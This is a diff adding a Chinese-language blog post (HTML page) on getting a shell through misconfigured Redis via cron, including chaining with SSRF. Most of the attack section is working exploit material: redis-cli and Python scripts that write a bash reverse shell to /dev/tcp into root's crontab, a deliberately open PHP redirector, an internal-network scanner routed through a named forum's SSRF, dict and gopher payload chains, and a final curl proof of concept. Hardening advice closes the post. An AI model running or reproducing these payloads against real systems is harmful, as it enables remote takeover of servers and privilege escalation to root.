@@ -1,0 +1,886 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <meta name="renderer" content="webkit">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" >
+  <link rel="dns-prefetch" href="http://www.lovebear.top">
+  <title>利用Redis通过cron进行Getshell（配合SSRF利用） | Blog for You</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="一、前言：Redis配置不当可能会导致未授权访问漏洞，本文利用此漏洞，通过cron进行Getshell，并给出实际攻击场景中配合SSRF漏洞进行的反弹shell攻击，最后会给出Redis的正确配置建议。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="利用Redis通过cron进行Getshell（配合SSRF利用）">
+<meta property="og:url" content="http://www.lovebear.top/2018/09/16/Redis_getshell/index.html">
+<meta property="og:site_name" content="Blog for You">
+<meta property="og:description" content="一、前言：Redis配置不当可能会导致未授权访问漏洞，本文利用此漏洞，通过cron进行Getshell，并给出实际攻击场景中配合SSRF漏洞进行的反弹shell攻击，最后会给出Redis的正确配置建议。">
+<meta property="og:updated_time" content="2018-09-17T02:29:20.039Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="利用Redis通过cron进行Getshell（配合SSRF利用）">
+<meta name="twitter:description" content="一、前言：Redis配置不当可能会导致未授权访问漏洞，本文利用此漏洞，通过cron进行Getshell，并给出实际攻击场景中配合SSRF漏洞进行的反弹shell攻击，最后会给出Redis的正确配置建议。">
+  
+    <link rel="alternative" href="/atom.xml" title="Blog for You" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  <link rel="stylesheet" href="/main.css?v=4.0.0.css">
+  
+
+  
+
+  <meta name="360-site-verification" content="a567763f2a0832b99ea6d0a57db81fbc" />
+  <script>(function(){
+var src = (document.location.protocol == "http:") ? "http://js.passport.qihucdn.com/11.0.1.js?1bc693950a04b443481f93da0209d936":"https://jspassport.ssl.qhimg.com/11.0.1.js?1bc693950a04b443481f93da0209d936";
+document.write('<script src="' + src + '" id="sozz"><\/script>');
+})();
+</script>
+<script>
+(function(){
+    var bp = document.createElement('script');
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+    }
+    else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+    }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+})();
+</script>
+
+  <script src="/js/jquery.js"></script>
+</head>
+
+<body>
+  <div id="container" q-class="show:isCtnShow">
+    <canvas id="anm-canvas" class="anm-canvas"></canvas>
+    <div class="left-col" q-class="show:isShow">
+      <div class="overlay"></div>
+<div class="intrude-less">
+	<header id="header" class="inner">
+		<a href="/" class="profilepic">
+			<img src="http://oeqaghyw9.bkt.clouddn.com/url/photoUrl.jpghead.jpg" class="js-avatar">
+		</a>
+
+		<hgroup>
+		  <h1 class="header-author"><a href="/">lovebear</a></h1>
+		</hgroup>
+
+		
+		<p class="header-subtitle">someone there for you</p>
+		
+
+		<nav class="header-menu">
+			<ul>
+			
+				<li><a href="/">主页</a></li>
+	        
+			</ul>
+		</nav>
+		<nav class="header-smart-menu">
+	        
+    		
+    			
+    			<a data-idx="0" q-on="click: openSlider(e, 'innerArchive')" href="javascript:void(0)">所有文章</a>
+    			
+    			
+            
+    			
+    			<a data-idx="1" q-on="click: openSlider(e, 'friends')" href="javascript:void(0)">友链</a>
+    			
+    			
+            
+    			
+    			<a data-idx="2" q-on="click: openSlider(e, 'aboutme')" href="javascript:void(0)">关于我</a>
+    			
+    			
+            
+		</nav>
+		<nav class="header-nav">
+			<div class="social">
+				
+					<a class="github" target="_blank" href="https://github.com/cckuailong/" title="github"><i class="icon-github"></i></a>
+		        
+					<a class="qq" target="_blank" href="/346813862" title="qq"><i class="icon-qq"></i></a>
+		        
+					<a class="weixin" target="_blank" href="/hjj19960127" title="weixin"><i class="icon-weixin"></i></a>
+		        
+					<a class="facebook" target="_blank" href="https://www.facebook.com/junjie.huo.18" title="facebook"><i class="icon-facebook"></i></a>
+		        
+			</div>
+		</nav>
+	</header>		
+</div>
+
+    </div>
+    <div class="mid-col" q-class="show:isShow,hide:isShow|isFalse">
+      <nav id="mobile-nav">
+  	<div class="overlay">
+  		<div class="slider-trigger"><i class="icon-sort"></i></div>
+  		<h1 class="header-author js-mobile-header hide">lovebear</h1>
+  	</div>
+	<div class="intrude-less">
+		<header id="header" class="inner">
+			<div class="profilepic">
+				<img src="http://oeqaghyw9.bkt.clouddn.com/url/photoUrl.jpghead.jpg" class="js-avatar">
+			</div>
+			<hgroup>
+			  <h1 class="header-author">lovebear</h1>
+			</hgroup>
+			
+			<p class="header-subtitle">someone there for you</p>
+			
+			<nav class="header-menu">
+				<ul>
+				
+					<li><a href="/">主页</a></li>
+		        
+		        
+		        	<li><a href="/archives/">所有文章</a></li>
+		        
+				</ul>
+			</nav>
+			<nav class="header-nav">
+				<div class="social">
+					
+						<a class="github" target="_blank" href="https://github.com/cckuailong/" title="github"><i class="icon-github"></i></a>
+			        
+						<a class="qq" target="_blank" href="/346813862" title="qq"><i class="icon-qq"></i></a>
+			        
+						<a class="weixin" target="_blank" href="/hjj19960127" title="weixin"><i class="icon-weixin"></i></a>
+			        
+						<a class="facebook" target="_blank" href="https://www.facebook.com/junjie.huo.18" title="facebook"><i class="icon-facebook"></i></a>
+			        
+				</div>
+			</nav>
+		</header>				
+	</div>
+</nav>
+
+      <div id="wrapper" class="body-wrap">
+        <div class="menu-l">
+          <div class="canvas-wrap">
+            <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
+          </div>
+          <div id="js-content" class="content-ll">
+            <article id="post-Redis_getshell" class="article article-type-post " itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      利用Redis通过cron进行Getshell（配合SSRF利用）
+    </h1>
+  
+
+        <a href="/2018/09/16/Redis_getshell/" class="archive-article-date">
+  	<time datetime="2018-09-16T08:43:05.399Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-09-16</time>
+</a>
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="一、前言："><a href="#一、前言：" class="headerlink" title="一、前言："></a>一、前言：</h2><p>Redis配置不当可能会导致未授权访问漏洞，本文利用此漏洞，通过cron进行Getshell，<br>并给出实际攻击场景中配合SSRF漏洞进行的反弹shell攻击，最后会给出Redis的正确<br>配置建议。</p>
+<a id="more"></a>
+<h2 id="二、Redis介绍："><a href="#二、Redis介绍：" class="headerlink" title="二、Redis介绍："></a>二、Redis介绍：</h2><p>Redis是一个使用ANSI C编写的开源、支持网络、基于内存、可选持久性的键值对存储<br>数据库。主流的30多种计算机编程语言都提供对Redis的支持。根据月度排行网站<br>DB-Engines.com的数据显示，Redis是最流行的键值对存储数据库。</p>
+<h2 id="三、漏洞介绍："><a href="#三、漏洞介绍：" class="headerlink" title="三、漏洞介绍："></a>三、漏洞介绍：</h2><ol>
+<li>Redis安装默认使用空口令（或管理员配置弱口令），会使暴露在公网上的Redis<br>服务受到严重的威胁。</li>
+<li>Redis配置允许远程修改DB文件的地址</li>
+<li>高权限运行Redis（Root运行），会导致提权</li>
+</ol>
+<h2 id="四、漏洞利用"><a href="#四、漏洞利用" class="headerlink" title="四、漏洞利用"></a>四、漏洞利用</h2><p>P.S. 需开启cron服务</p>
+<ol>
+<li>可以远程登陆Redis</li>
+</ol>
+<p>Redis存在弱口令或空口令，攻击者可以进行远程登陆。<br>连接Redis后，进行反弹shell的操作，分为windows和linux。</p>
+<p>(1) windows中：</p>
+<pre><code>config set dir /var/spool/cron    #设置文件保存路径
+config set dbfilename root        #设置文件名
+set xxx &quot;\n\n*/1**** /bin/bash -i &gt;&amp; /dev/tcp/#ip#/#port# 0&gt;&amp;1\n\n&quot;  #变量赋值
+save          #保存到文件中
+</code></pre><p>P.S. 第三句中写入文件的内容是cron的时程表格式 f1 f2 f3 f4 f5 program<br>语句表示，每隔一秒，执行一次bash反弹shell的命令</p>
+<p>(2) linux中：</p>
+<pre><code>echo -e &quot;\n\n*/1**** /bin/bash -i &gt;&amp; /dev/tcp/#ip#/#port# 0&gt;&amp;1\n\n\n&quot; | redis-cli -h #ip# -x set xxx
+redis-cli -h #ip# config set dir /var/spool/cron
+redis-cli -h #ip# config set dbfilename root
+redis-cli -h #ip# save
+</code></pre><p>P.S. 可以发现这里bash语句最后多了一个’\n’，这是因为echo重定向后会自带一个’\n’</p>
+<p>(3) python版：</p>
+<pre><code>import redis
+
+def getshell():
+    try:
+        r = redis.StrictRedis(host=&#39;#ip#&#39;, port=#port#, db=0, socket_timeout=10)
+        r.set(xxx, &#39;\n\n*/1**** /bin/bash -i &gt;&amp; /dev/tcp/#ip#/#port# 0&gt;&amp;1\n\n&#39;)
+        r.config_set(&#39;dir&#39;, &#39;/var/spool/cron&#39;)
+        r.config_set(&#39;dbfilename&#39;, &#39;root&#39;)
+        r.save()
+    except:
+        pass
+
+if __name__ == &#39;__main__&#39;:
+    getshell()
+</code></pre><p>P.S. 上述getshell代码，在Redis服务由Root用户启动的情况下，可以将shell提权到Root权限。</p>
+<ol>
+<li>配合ssrf漏洞进行利用（利用Redis漏洞的原理和上面基本一致）</li>
+</ol>
+<p>(1) 利用dict协议</p>
+<p>dict协议有一个功能：dict://serverip:port/name:data 向服务器的端口请求 name data，并在末尾<br>自动补上rn(CRLF)。也就是如果我们发出dict://serverip:port/config:set:dir:/var/spool/cron/<br>的请求，redis就执行了config set dir /var/spool/cron/ rn.用这种方式可以一步步执行<br>redis getshell的exp。</p>
+<p>这里提前给出下面会用到的exp.php（产生漏洞代码）的内容<br>P.S. 这里没有限制协议为Http,Https, 如目标curl配置进行了协议限制，可使用gopher，参见(2)</p>
+<pre><code>&lt;?php
+$ip = $_GET[&#39;ip&#39;];
+$port = $_GET[&#39;port&#39;];
+$scheme = $_GET[&#39;s&#39;];
+$data = $_GET[&#39;data&#39;];
+header(&quot;Location: $scheme://$ip:$port/$data&quot;);
+?&gt;
+</code></pre><p>1) 首先扫描内网开放6379端口（Redis服务）的主机：</p>
+<pre><code>import requests
+import threading
+import Queue
+import time
+
+threads_count = 20
+que = Queue.Queue()
+lock = threading.Lock()
+threads = []
+ip = &quot;10.171.&quot;
+
+for i in range(1,255):
+    for j in range(1,255):
+        que.put(ip + str(i) + &#39;.&#39;+str(j))
+
+def run():
+    while que.qsize() &gt; 0:
+        ip = que.get()
+        try:
+            url = &quot;http://bbs.phpinfo.me/forum.php?mod=ajax&amp;action=downremoteimg&amp;message=[img]http://tools.phpinfo.me/ssrf.php?s=ftp%26ip={ip}%26port={port}%26data=helo.jpg[/img]&quot;.format(
+                ip=ip,
+                port=&quot;65321&quot;)
+            r = requests.get(url,timeout=5)
+
+            try:
+                url = &quot;https://bbs.phpinfo.me/forum.php?mod=ajax&amp;action=downremoteimg&amp;message=[img]http://tools.phpinfo.me/ssrf.php?s=ftp%26ip={ip}%26port={port}%26data=helo.jpg[/img]&quot;.format(
+                ip=ip,
+                port=&quot;6379&quot;)
+                r = requests.get(url,timeout=5)
+                lock.acquire()
+                print ip
+                lock.release()
+            except :
+                lock.acquire()
+                print &quot;{ip}  6379 Open&quot;.format(ip=ip)
+                lock.release()
+        except:
+            pass
+
+for i in range(threads_count):
+    t = threading.Thread(target=run)
+    threads.append(t)
+    t.setDaemon(True)
+    t.start()
+while que.qsize() &gt; 0:
+    time.sleep(1.0)
+</code></pre><p>2) 通过ssrf漏洞结合Redis配置漏洞进行shell反弹</p>
+<pre><code>import requests
+
+host = &#39;10.171.26.22&#39;
+port = &#39;6379&#39;
+bhost = &#39;phpinfo.me&#39;
+bport = &#39;32&#39;
+
+vul_httpurl = &#39;https://bbs.phpinfo.me/forum.php?mod=ajax&amp;action=downremoteimg&amp;message=[img]&#39;
+_location = &#39;http://tools.phpinfo.me/ssrf.php&#39;
+shell_location = &#39;http://tools.phpinfo.me/shell.php&#39;
+
+#1 flush db
+_payload = &#39;?s=dict%26ip={host}%26port={port}%26data=flushall&#39;.format(
+    host = host,
+    port = port)
+exp_uri = &#39;{vul_httpurl}{0}{1}%23helo.jpg[/img]&#39;.format(_location, _payload, vul_httpurl=vul_httpurl)
+
+print exp_uri
+print len(requests.get(exp_uri).content)
+
+#2 set crontab command
+_payload = &#39;?s=dict%26ip={host}%26port={port}%26bhost={bhost}%26bport={bport}&#39;.format(
+    host = host,
+    port = port,
+    bhost = bhost,
+    bport = bport)
+exp_uri = &#39;{vul_httpurl}{0}{1}%23helo.jpg[/img]&#39;.format(shell_location, _payload, vul_httpurl=vul_httpurl)
+
+print exp_uri
+print len(requests.get(exp_uri).content)
+
+#3 config set dir /var/spool/cron/
+_payload = &#39;?s=dict%26ip={host}%26port={port}%26data=config:set:dir:/var/spool/cron/&#39;.format(
+    host = host,
+    port = port)
+exp_uri = &#39;{vul_httpurl}{0}{1}%23helo.jpg[/img]&#39;.format(_location, _payload, vul_httpurl=vul_httpurl)
+
+print exp_uri
+print len(requests.get(exp_uri).content)
+
+#4 config set dbfilename root
+_payload = &#39;?s=dict%26ip={host}%26port={port}%26data=config:set:dbfilename:root&#39;.format(
+    host = host,
+    port = port)
+exp_uri = &#39;{vul_httpurl}{0}{1}%23helo.jpg[/img]&#39;.format(_location, _payload, vul_httpurl=vul_httpurl)
+
+print exp_uri
+print len(requests.get(exp_uri).content)
+
+#5 save to file
+_payload = &#39;?s=dict%26ip={host}%26port={port}%26data=save&#39;.format(
+    host = host,
+    port = port)
+exp_uri = &#39;{vul_httpurl}{0}{1}%23helo.jpg[/img]&#39;.format(_location, _payload, vul_httpurl=vul_httpurl)
+
+print exp_uri
+print len(requests.get(exp_uri).content)
+</code></pre><p>(2) 利用gopher协议</p>
+<p>如果目标curl配置了限制协议为Http, Https，dict方式就会失效，这时可以利用gopher协议进行getshell。<br>利用原理基本一致，但是把脚本转为gopher协议的格式比较棘手。</p>
+<p>先给出shell.sh, 上面有提到，这里为了方便再给出一下</p>
+<pre><code>echo -e &quot;\n\n\n*/1 * * * * bash -i &gt;&amp; /dev/tcp/#ip#/#port# 0&gt;&amp;1\n\n\n&quot;|redis-cli -h $1 -p $2 -x set 1
+redis-cli -h $1 -p $2 config set dir /var/spool/cron/
+redis-cli -h $1 -p $2 config set dbfilename root
+redis-cli -h $1 -p $2 save
+redis-cli -h $1 -p $2 quit
+</code></pre><p>1) 获取Redis攻击的TCP数据包（需要提前获得服务器命令执行权限）<br>使用socat进行端口转发</p>
+<pre><code>socat -v tcp-listen:4444,fork tcp-connect:localhost:6379
+</code></pre><p>将本地的4444端口转发到本地的6379端口。访问该服务器的4444端口，访问的其实是该服务器的6379端口。<br>执行</p>
+<pre><code>bash shell.sh #servip# 4444
+</code></pre><p>捕获到数据如下（例）</p>
+<pre><code>&gt; 2017/10/11 01:24:52.432446  length=85 from=0 to=84
+*3\r
+$3\r
+set\r
+$1\r
+1\r
+$58\r
+
+
+
+*/1 * * * * bash -i &gt;&amp; /dev/tcp/127.0.0.1/2333 0&gt;&amp;1
+
+
+
+\r
+&lt; 2017/10/11 01:24:52.432685  length=5 from=0 to=4
++OK\r
+&gt; 2017/10/11 01:24:52.435153  length=57 from=0 to=56
+*4\r
+$6\r
+config\r
+$3\r
+set\r
+$3\r
+dir\r
+$16\r
+/var/spool/cron/\r
+&lt; 2017/10/11 01:24:52.435332  length=5 from=0 to=4
++OK\r
+&gt; 2017/10/11 01:24:52.437594  length=52 from=0 to=51
+*4\r
+$6\r
+config\r
+$3\r
+set\r
+$10\r
+dbfilename\r
+$4\r
+root\r
+&lt; 2017/10/11 01:24:52.437760  length=5 from=0 to=4
++OK\r
+&gt; 2017/10/11 01:24:52.439943  length=14 from=0 to=13
+*1\r
+$4\r
+save\r
+&lt; 2017/10/11 01:24:52.443318  length=5 from=0 to=4
++OK\r
+&gt; 2017/10/11 01:24:52.446034  length=14 from=0 to=13
+*1\r
+$4\r
+quit\r
+&lt; 2017/10/11 01:24:52.446148  length=5 from=0 to=4
++OK\r
+</code></pre><p>2) 数据转换为gopher格式<br>转换规则：<br>● 如果第一个字符是&gt;或者&lt; 那么丢弃该行字符串，表示请求和返回的时间。<br>● 如果前3个字符是+OK 那么丢弃该行字符串，表示返回的字符串。<br>● 将\r字符串替换成%0d%0a<br>● 空白行替换为%0a</p>
+<p>这里有个python脚本进行转换</p>
+<pre><code>import sys
+
+exp = &#39;&#39;
+
+with open(sys.argv[1]) as f:
+    for line in f.readlines():
+        if line[0] in &#39;&gt;&lt;+&#39;:
+            continue
+        # 判断倒数第2、3字符串是否为\r
+        elif line[-3:-1] == r&#39;\r&#39;:
+            # 如果该行只有\r，将\r替换成%0a%0d%0a
+            if len(line) == 3:
+                exp = exp + &#39;%0a%0d%0a&#39;
+            else:
+                line = line.replace(r&#39;\r&#39;, &#39;%0d%0a&#39;)
+                # 去掉最后的换行符
+                line = line.replace(&#39;\n&#39;, &#39;&#39;)
+                exp = exp + line
+        # 判断是否是空行，空行替换为%0a
+        elif line == &#39;\x0a&#39;:
+            exp = exp + &#39;%0a&#39;
+        else:
+            line = line.replace(&#39;\n&#39;, &#39;&#39;)
+            exp = exp + line
+print exp
+</code></pre><p>转换结果：</p>
+<pre><code>*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$58%0d%0a%0a%0a%0a*/1 * * * * 
+bash -i &gt;&amp; /dev/tcp/127.0.0.1/2333 0&gt;&amp;1%0a%0a%0a%0a%0d%0a*4%0d%0a$6%0d%0a
+config%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/
+%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a
+$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0a*1%0d%0a$4%0d%0aquit%0d%0a
+</code></pre><p>P.S. 需要注意的是，如果要换IP和端口，前面的$58也需要更改，$58表示字符串长度<br>为58个字节，上面的EXP即是</p>
+<pre><code>%0a%0a%0a*/1 * * * * bash -i &gt;&amp; /dev/tcp/127.0.0.1/2333 0&gt;&amp;1%0a%0a%0a%0a
+</code></pre><p>3+51+4=58。如果想换成42.256.24.73，那么$58需要改成$61，以此类推就行。<br>然后将得到的gopher格式的结果进行urlencode编码<br>最终的Poc为</p>
+<pre><code>curl -v &#39;http://#servip#/exp.php?
+url=gopher%3A%2F%2F127.0.0.1%3A6379%2F_%2A3%250d%250a%243%250d%250aset%250d%250a%241%
+250d%250a1%250d%250a%2456%250d%250a%250d%250a%250a%250a%2A%2F1%20%2A%20%2A%20%2A%20%2
+A%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F127.0.0.1%2F2333%200%3E%261%250a%250a%250a%25
+0d%250a%250d%250a%250d%250a%2A4%250d%250a%246%250d%250aconfig%250d%250a%243%250d%250a
+set%250d%250a%243%250d%250adir%250d%250a%2416%250d%250a%2Fvar%2Fspool%2Fcron%2F%250d
+%250a%2A4%250d%250a%246%250d%250aconfig%250d%250a%243%250d%250aset%250d%250a%2410%250d
+%250adbfilename%250d%250a%244%250d%250aroot%250d%250a%2A1%250d%250a%244%250d%250asave
+%250d%250a%2A1%250d%250a%244%250d%250aquit%250d%250a&#39;
+</code></pre><h2 id="五、配置建议"><a href="#五、配置建议" class="headerlink" title="五、配置建议"></a>五、配置建议</h2><ol>
+<li>禁止一些高危命令（重启redis才能生效）<br>(1) 修改 redis.conf 文件，禁用远程修改 DB 文件地址</li>
+</ol>
+<pre><code>rename-command FLUSHALL &quot;&quot;
+rename-command CONFIG &quot;&quot;
+rename-command EVAL &quot;&quot;
+</code></pre><p>(2) 修改redis.conf文件，改变这些高危命令的名称</p>
+<pre><code>rename-command FLUSHALL &quot;name1&quot;
+rename-command CONFIG &quot;name2&quot;
+rename-command EVAL &quot;name3&quot;
+</code></pre><ol>
+<li>以低权限运行 Redis 服务（重启redis才能生效）</li>
+<li>为 Redis 添加密码验证（重启redis才能生效）</li>
+<li>禁止外网访问 Redis（重启redis才能生效）<br>修改 redis.conf 文件，添加或修改，使得 Redis 服务只在当前主机可用</li>
+</ol>
+<pre><code>bind 127.0.0.1
+</code></pre><p>在redis3.2之后，redis增加了protected-mode，在这个模式下，非绑定IP或者没有配置密码访问时都会报错</p>
+<ol>
+<li>修改默认端口<br>修改配置文件redis.conf文件</li>
+</ol>
+<pre><code>Port 6379
+</code></pre><ol>
+<li>设置防火墙策略<br>设置IP白名单等过滤流量访问的策略。</li>
+</ol>
+
+      
+
+      
+        <div class="page-reward">
+          <a href="javascript:;" class="page-reward-btn tooltip-top">
+            <div class="tooltip tooltip-east">
+            <span class="tooltip-item">
+              赏
+            </span>
+            <span class="tooltip-content">
+              <span class="tooltip-text">
+                <span class="tooltip-inner">
+                  <p class="reward-p"><i class="icon icon-quo-left"></i>谢谢你请我吃糖果<i class="icon icon-quo-right"></i></p>
+                  <div class="reward-box">
+                    
+                    <div class="reward-box-item">
+                      <img class="reward-img" src="http://oeqaghyw9.bkt.clouddn.com/url/zhifubao.JPG">
+                      <span class="reward-type">支付宝</span>
+                    </div>
+                    
+                    
+                  </div>
+                </span>
+              </span>
+            </span>
+          </div>
+          </a>
+        </div>
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags"></i>
+		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Vulnerability/">Vulnerability</a></li></ul>
+	</div>
+
+      
+
+      
+
+      
+        
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
+        </div>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="http://s.jiathis.com/qrcode.php?url=http://www.lovebear.top/2018/09/16/Redis_getshell/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+  
+<nav id="article-nav">
+  
+  
+    <a href="/2018/09/16/Linux_shell/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">Linux反弹shell的N种方法</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
+
+
+
+
+
+<div class="duoshuo">
+	<!-- 多说评论框 start -->
+	<div class="ds-thread" data-thread-key="Redis_getshell" data-title="利用Redis通过cron进行Getshell（配合SSRF利用）" data-url="http://www.lovebear.top/2018/09/16/Redis_getshell/"></div>
+	<!-- 多说评论框 end -->
+	<!-- 多说公共JS代码 start (一个网页只需插入一次) -->
+	<script type="text/javascript">
+	var duoshuoQuery = {short_name:"lovebear"};
+	(function() {
+		var ds = document.createElement('script');
+		ds.type = 'text/javascript';ds.async = true;
+		ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
+		ds.charset = 'UTF-8';
+		(document.getElementsByTagName('head')[0] 
+		 || document.getElementsByTagName('body')[0]).appendChild(ds);
+	})();
+	</script>
+	<!-- 多说公共JS代码 end -->
+</div>
+
+
+
+
+
+          </div>
+        </div>
+      </div>
+      <footer id="footer">
+  <div class="outer">
+    <div id="footer-info">
+    	<div class="footer-left">
+    		&copy; 2018 lovebear
+    	</div>
+      	<div class="footer-right">
+      		<a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/litten/hexo-theme-yilia" target="_blank">Yilia</a> by Lovebear
+      	</div>
+		<script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+		</script>
+		<span id="busuanzi_container_site_pv">
+			Total Visit: <span id="busuanzi_value_page_pv"><i class="fa fa-spinner fa-spin"></i></span> times
+		</span>
+    </div>
+  </div>
+</footer>
+    </div>
+    <script>
+	var yiliaConfig = {
+		mathjax: false,
+		isHome: false,
+		isPost: true,
+		isArchive: false,
+		isTag: false,
+		isCategory: false,
+		open_in_new: false,
+		root: "/",
+		innerArchive: true
+	}
+</script>
+
+<script src="/./main.js?v=4.0.0.js"></script>
+
+
+
+<div id="totop" style="position:fixed;bottom:50px;right:30px;cursor: pointer;">
+<a title="totop"><img src="/img/scrollup.png"/></a>
+</div>
+<script src="/js/totop.js"></script>
+    
+<div class="tools-col" q-class="show:isShow,hide:isShow|isFalse" q-on="click:stop(e)">
+  <div class="tools-wrap">
+    
+    	<section class="tools-section tools-section-all" q-show="innerArchive">
+        <div class="search-wrap">
+          <input class="search-ipt" q-model="search" type="text" placeholder="find something…">
+          <i class="icon-search icon" q-show="search|isEmptyStr"></i>
+          <i class="icon-close icon" q-show="search|isNotEmptyStr" q-on="click:clearChose(e)"></i>
+        </div>
+        <div class="widget tagcloud search-tag">
+          <p class="search-tag-wording">tag:</p>
+          <label class="search-switch">
+            <input type="checkbox" q-on="click:toggleTag(e)" q-attr="checked:showTags">
+          </label>
+          <ul class="article-tag-list" q-show="showTags">
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)">Ubuntu</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)">Apache</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)">ctf</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)">Linux</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)">python</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)">md5</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)">hexo</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)">Vulnerability</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)">image</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)">ubuntu</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)">翻墙</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)">pacman</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)">ssl</a>
+              </li>
+            
+            <div class="clearfix"></div>
+          </ul>
+        </div>
+        <ul class="search-ul">
+          <p q-show="jsonFail" style="padding: 20px; font-size: 12px;">
+            缺失模块。<br/>1、在博客根目录（注意不是yilia根目录）执行以下命令：<br/> npm i hexo-generator-json-content --save<br/><br/>
+            2、在根目录_config.yml里添加配置：
+<pre style="font-size: 12px;" q-show="jsonFail">
+  jsonContent:
+    meta: false
+    pages: false
+    posts:
+      title: true
+      date: true
+      path: true
+      text: true
+      raw: false
+      content: false
+      slug: false
+      updated: false
+      comments: false
+      link: false
+      permalink: false
+      excerpt: false
+      categories: false
+      tags: true
+</pre>
+          </p>
+          <li class="search-li" q-repeat="items" q-show="isShow">
+            <a q-attr="href:path|urlformat" class="search-title"><i class="icon-quo-left icon"></i><span q-text="title"></span></a>
+            <p class="search-time">
+              <i class="icon-calendar icon"></i>
+              <span q-text="date|dateformat"></span>
+            </p>
+            <p class="search-tag">
+              <i class="icon-price-tags icon"></i>
+              <span q-repeat="tags" q-on="click:choseTag(e, name)" q-text="name|tagformat"></span>
+            </p>
+          </li>
+        </ul>
+    	</section>
+    
+
+    
+    	<section class="tools-section tools-section-friends" q-show="friends">
+  		
+        <ul class="search-ul">
+          
+            <li class="search-li">
+              <a href="https://github.com/litten/hexo-theme-yilia" target="_blank" class="search-title"><i class="icon-quo-left icon"></i>hexo主题</a>
+            </li>
+          
+            <li class="search-li">
+              <a href="https://portal.qiniu.com/" target="_blank" class="search-title"><i class="icon-quo-left icon"></i>七牛云</a>
+            </li>
+          
+            <li class="search-li">
+              <a href="http://ibruce.info/2013/11/22/hexo-your-blog/" target="_blank" class="search-title"><i class="icon-quo-left icon"></i>不如</a>
+            </li>
+          
+            <li class="search-li">
+              <a href="http://www.cnblogs.com/tengj/p/5353897.html" target="_blank" class="search-title"><i class="icon-quo-left icon"></i>深入hexo</a>
+            </li>
+          
+            <li class="search-li">
+              <a href="https://www.dnspod.cn/Login" target="_blank" class="search-title"><i class="icon-quo-left icon"></i>DNSPod</a>
+            </li>
+          
+            <li class="search-li">
